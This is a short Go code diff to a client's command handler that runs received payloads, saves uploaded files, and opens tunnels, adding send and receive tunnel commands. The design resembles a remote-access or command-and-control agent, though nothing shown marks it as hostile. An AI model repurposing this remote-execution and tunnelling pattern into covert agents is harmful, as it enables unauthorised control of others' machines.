@@ -128,22 +128,21 @@ func (r *Client) HandleCommand(com *commands.Command) error {
 	var err error
 	switch com.Type {
 	case commands.Exec:
-		out, err := commands.RunExec(com.Payload)
-		r.CommandOutput = out
+		r.CommandOutput, err = commands.RunExec(com.Payload)
 		return err
 	case commands.Upload:
 		if err := commands.SaveFile(com.Payload); err != nil {
 			return err
 		}
 	case commands.StartTunnel:
-		r.tun, err = commands.NewTunnel(com)
-		if err != nil {
-			r.CommandOutput = []byte("Failed")
-		} else {
-			r.CommandOutput = []byte("Tunneling")
-		}
+		r.tun, r.CommandOutput = commands.NewTunnel(com)
 	case commands.StopTunnel:
 		r.tun.Close()
+	case commands.SendOT:
+		r.CommandOutput = r.tun.Send(com)
+	case commands.RecvOT:
+		r.CommandOutput = r.tun.Recv(com)
+
 	default:
 		return commands.NewCommandError("Unknown command type: " + string(com.Type))
 	}
